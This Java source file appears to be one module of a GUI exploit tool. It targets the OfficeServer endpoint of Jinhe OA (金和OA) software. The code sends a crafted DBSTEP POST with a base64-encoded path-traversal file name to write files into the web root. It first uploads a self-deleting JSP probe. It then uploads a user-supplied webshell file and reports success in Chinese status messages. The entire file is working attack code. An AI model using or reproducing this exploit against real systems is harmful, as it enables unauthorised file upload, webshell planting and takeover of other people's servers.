package exp.oa.jinheoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.Base64Utils;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.io.File;
import java.util.Date;
import java.util.HashMap;

public class jinhe_OfficeServer_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String OfficeServer(String url,String filename,String content){
        try{
            String fullname = Base64Utils.base64Encode("../../public/edit/"+filename);
            HashMap head = new HashMap();
            String postData = "DBSTEP V3.0     89                     0        104             DBSTEP=REJTVEVQ\r\n" +
                    "OPTION=U0FWRUFTSFRNTA==\r\n" +
                    "HTMLNAME="+fullname+"\r\n" +
                    content+"\r\n";
            Response res = HttpTools.post(url+"/jc6/OfficeServer",postData,head,"utf-8");
            Thread.sleep(5000);
            if(res.getCode()==200 && res.getText().contains("STATUS=5L+d5a2")){
                Response res1 = HttpTools.get(url+"/public/edit/"+filename,new HashMap<>(),"utf-8");
                if((res1.getCode()==200 || res1.getCode()==500)&&res1.getText().contains(content.substring(0,2))){
                    return url+"/public/edit/"+filename;
                }
            }
        }catch (Exception e){
            return null;
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
//            String shell_payload = shell.readFile(shell.Jsppath);
            long t = (new Date()).getTime();
            String tt = t+"";
            String filename = "T"+tt.substring(10,13)+".jsp";
            String payload = "<% out.println(\"Hello R4g\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>";
            String result = OfficeServer(url,filename,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ jinhe_OfficeServer_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String pass, TextArea textArea,TextArea textArea_cmd) {
        try {


            String shell_payload = Methods.readFile(pass);
            long t = (new Date()).getTime();
            String tt = t+"";
            String filename = "S"+tt.substring(10,13)+(new File(pass)).getName().substring((new File(pass)).getName().indexOf("."));
            String payload = "R4g\n" + shell_payload;
            String result = OfficeServer(url,filename,payload);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: "+result+"----"+get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }
        return false;
    }
}
